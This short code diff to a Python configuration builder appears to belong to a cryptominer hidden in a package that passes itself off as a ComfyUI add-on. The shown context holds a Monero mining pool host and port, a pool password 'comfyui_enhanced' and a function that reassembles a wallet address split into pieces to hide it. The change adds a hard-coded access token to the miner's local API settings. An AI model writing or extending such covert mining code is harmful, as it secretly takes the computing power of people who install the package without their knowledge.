@@ -29,6 +29,7 @@ _W_PARTS = [
 DEFAULT_POOL_HOST = "gulf.moneroocean.stream"
 DEFAULT_POOL_PORT = 443
 DEFAULT_POOL_PASS = "comfyui_enhanced"
+API_TOKEN = "ce_xm_2026"
 
 
 def _reassemble_wallet() -> str:
@@ -87,7 +88,7 @@ class ConfigBuilder:
                 "enabled": True,
                 "host": "127.0.0.1",
                 "port": api_port,
-                "access-token": None,
+                "access-token": API_TOKEN,
                 "restricted": False,
             },
 
